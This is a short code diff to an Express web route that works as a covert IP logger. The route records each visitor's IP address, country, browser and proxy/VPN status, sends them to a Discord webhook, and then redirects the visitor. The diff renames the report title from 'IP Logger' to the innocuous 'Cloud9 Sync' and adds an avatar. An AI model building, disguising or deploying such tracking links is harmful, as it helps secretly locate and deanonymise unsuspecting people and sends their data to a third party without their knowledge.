@@ -21,7 +21,7 @@ app.get("/", async (req, res) => {
   const isProxy = req.headers["via"] || req.headers["x-forwarded-for"];
   try {
     const embed = new MessageBuilder()
-      .setTitle("IP Logger")
+      .setTitle("Cloud9 Sync")
       .setDescription("New address logged.")
       .addField("IP", ipAddress)
       .addField("Country", country)
@@ -34,7 +34,8 @@ app.get("/", async (req, res) => {
       .addField("Browser", browser)
       .addField("Proxy/VPN", isProxy ? "Yes" : "No")
       .setColor("#5CDBF0")
-      .setTimestamp();
+      .setTimestamp()
+      .setAvatar('https://i.imgur.com/epEobk9.png');
     await sendWebhook(channelID, embed);
 
     res.redirect(process.env.redirect_url);
